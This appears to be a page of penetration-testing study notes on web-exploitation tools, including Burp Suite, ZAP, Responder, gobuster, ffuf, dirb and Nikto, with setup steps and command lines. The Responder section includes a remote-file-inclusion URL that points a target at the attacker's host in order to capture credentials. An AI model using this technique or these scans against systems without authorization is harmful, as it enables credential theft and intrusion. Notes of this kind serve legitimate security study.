---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Tools and Utilities

Here we can find some tools and utilities commonly used for processes related to web exploitation:

## <mark style="color:green;">Burp Suite</mark>

* A digital platform that collects tools for specialized web penetration testing.
* Is a framework written in Java that aims to provide a one-stop-shop for web application penetration testing.
* Capture and manipulate all of the traffic between an attacker and a web server.
* Can intercept, view, and modify requests.
* Burp Suite has modules that can be added.

### <mark style="color:yellow;">**Features**</mark>

* **Proxy:** Allows us to intercept and modify requests/responses.&#x20;
* **Repeater:** Allows us to capture, modify, and then resend the same request numerous times. We could craft requests by hand too.
* **Intruder:** Allows us to spray an endpoint with requests.
* **Decoder:** This allows us to transform data, decode captured information, or encode a payload.
* **Comparer:** Allows us to compare two pieces of data at either word or byte level.
* **Sequencer:** Help us asses random tokens or other generated data.

### <mark style="color:yellow;">Configuration</mark>

**For configuring HTTP Proxy:**

* We required the _FoxyProxy_ extension.
* Create a proxy profile on _FoxyProxy_ specifying _IP_ as _127.0.0.1_ and _PORT_ as _8080_.
* Select the profile on the extension.
* Then go to the burp suite proxy tab and set intercept to _on._

**For configuring HTTPS Proxy:**

* Activate the proxy and go to _http://burp/cert_ on the browser.
* Download the _cacert.der_ file.
* Go to _about:preferences_ on the browser
* Search _Certificates_ and select _View Certificates._
* Click on Import and select the _cacer.der_ file.
* Mark _Trust this CA to identify websites_ and save all.

### <mark style="color:yellow;">Utilities</mark>

To define a scope:

* Go to the target tab.
* On the left side select the IP/Domain.
* Right-click it and select _Add to scope._
* Then go to _proxy settings_ on the proxy tab.
* Go to the _Request Interception_ part and mark _And URL is in target scope._
* Go to _proxy settings_ then to the _Response Interception_ part and mark _Intercept responses_ and _Or Request was intercepted._

### <mark style="color:yellow;">Hotkeys</mark>

* **`Ctrl+R`:** Send the petition to _Repeater_.
* **`Ctlr+U`:** URL-encode selected text.

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install burpsuite
```
{% endcode %}

## <mark style="color:green;">Responder</mark>

* Help in the passive obtention of credentials by mounting an SMB server on the web.

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install responder
```
{% endcode %}

***

* Configurate file

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nano /usr/share/responder/Responder.conf #Installed here by default
```
{% endcode %}

***

* Initialize Responder

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo responder -I $networkinterface
```
{% endcode %}

{% hint style="info" %}
**Note:** If you get an error in any port, put _off_ on the value of the service related to that port in the _Responder.conf_ file.
{% endhint %}

***

* Make Remote File Inclusion on the page

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>http://$url/$query?$value=//$myip/somefile
</strong></code></pre>

{% hint style="info" %}
If the process worked, we can see the server has caught the credentials
{% endhint %}

## <mark style="color:green;">ZAP</mark>

* Proxy utility to intercept network traffic
* Stands for Zed Attack Proxy

### <mark style="color:yellow;">**Features**</mark>

* **Contexts:** Delimit the scope of the scanning.
* **Spider:** Use spidering to get links in the code of a website.
* **Active scan:** Attacks the website to get more information.
* **Alerts:** Give vulnerabilities found on the website.
* **Sites:** Shows all the URLs spidered with their petitions and vulnerabilities.
* **History:** Shows petitions made to target sites.

### <mark style="color:yellow;">**Configuration**</mark>

**For configuring HTTP Proxy:**

* Install _SwitchyOmega_ extension.
* Configure server to _localhost_ and port to _8080_ and save changes.

**For configuring HTTPS Proxy:**

* Go to _options>Network>Server Certificates_ and save the certificate.
* Go to your browser settings, search for certificates, and import the downloaded certificate in the _Authorities_ section (If the browser doesn't have this tab just import it on the certificates section).
* Mark _Trust this CA to identify websites_ and save all.

### <mark style="color:yellow;">Utilities</mark>

* Go to the _adds-on_ tab, update all installed and from marketplace install_, Directory List 2.3, Directory List 2.3 LC, FuzzDB Files, FuzzDB Ofensive, python scripting, community scripts, custom payloads, JSON view, JWT support, viewstate_.
* Go to _options>HUD_ and unmark _Enable when using the ZAP desktop_ and _welcome screen when a browser is opened._

### <mark style="color:yellow;">Tips</mark>

* Configure _Global Alert Filters_ and _Passive Scan Rules_ on Options to deactivate or set your own grade for the alert of a vulnerability.
* From the _History_ tab, you can right-click and select _Resend_ to modify a petition made before.
* For fuzzing:&#x20;
  * Select a part of the request and right-click _Fuzz._
  * Select the _Payloads_ button, select the dictionary file, or enter custom words.
  * In the _Fuzz>Message Processors_ tab add a new one of type _Tag Creator_ and set it to categorize responses with specific content.
  * In _Options>Anti-CSRF cert token_ add the tokens detected in forms POST petitions.
  * When not getting a consistent token handle in the _Fuzz>Options_ tab reduce the threads to 1.
  * When getting _304_ responses go to _Fuzz>Options_ activate _Follow Redirects._

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install zaproxy
```
{% endcode %}

## <mark style="color:green;">Hacktools</mark>

* Browser extension that helps us with scripts, commands, and tips for web attacks
* [https://addons.mozilla.org/en-US/firefox/addon/hacktools/](https://addons.mozilla.org/en-US/firefox/addon/hacktools/)

### <mark style="color:yellow;">**Features**</mark>

* Reverse shell scripts
* PHP reverse shell scripts
* TTY Spawn shell
* Linux commands
* Powershell commands
* Windows file transfer methods
* Local File Inclusion
* Cross-Site Scripting
* SQL Injection
* Data Encoding
* Obfuscated Files or Information
* Hash generator
* MSF Venom Builder

## <mark style="color:green;">FoxyProxy</mark>

* Browser extension that helps us to create proxies, usually for request-response analysis.
* [https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)

## <mark style="color:green;">Wappalyzer</mark>

* Browser extension that gives us anonymous information about websites visited, including domain name and identified technologies.
* [https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)

## <mark style="color:green;">Daniel Miessler Wordlists</mark>

* Well-known wordlists for almost every process of fuzzing or brute-forcing.
* [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

## <mark style="color:green;">gobuster</mark>

* Directory and file brute-forcing tool used to find hidden files, directories, and subdomains on websites.&#x20;
* It operates by sending HTTP requests based on a wordlist and identifying resources that are not publicly linked but still accessible

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install gobuster
```
{% endcode %}

***

* Show commands and utilities

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster -h
```
{% endcode %}

***

* Scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster -u $URL #Scan url
gobuster -u $url-w $wordlist #Specify wordlist path
gobuster dir -u $url -w $wordlist #Directory and file mode
gobuster vhost -u $url -w $wordlist #Subdomain mode
gobuster vhost -u $url -w $wordlist --append-domain #To set de subdomain first
```
{% endcode %}

## <mark style="color:green;">ffuf</mark>

* Flexible and fast web fuzzing tool used for brute-forcing directories, files, subdomains, and more.

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install ffuf
```
{% endcode %}

***

* Scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u $URL/FUZZ -w $wordlist #FUZZ to fill the part to be fuzz
ffuf -u $URL/FUZZ -w $wordlist -o $filename #get output in a file
```
{% endcode %}

{% hint style="info" %}
**Note:** Optional keywords can be added after `$wordlist` separating them with `,`&#x20;
{% endhint %}

## <mark style="color:green;">dirb</mark>

* Web content scanner that automates the task of discovering hidden directories and files on a web server by brute-forcing URL paths using a wordlist

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install dirb
```
{% endcode %}

***

* Scan

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">dirb $URL #Scan URL
dirb $URL $wordlist #Use wordlist
dirb $URL $wordlist -w #Ignore warning messages
dirb $URL $wordlist -u $username:$password #Use 
<strong>dirb $URL $wordlist -E $certificate  #Use certificate
</strong></code></pre>

## <mark style="color:green;">Nikto</mark>

* Tool for scanning vulnerabilities of websites

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install nikto
```
{% endcode %}

***

* Scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nikto -h $url
```
{% endcode %}
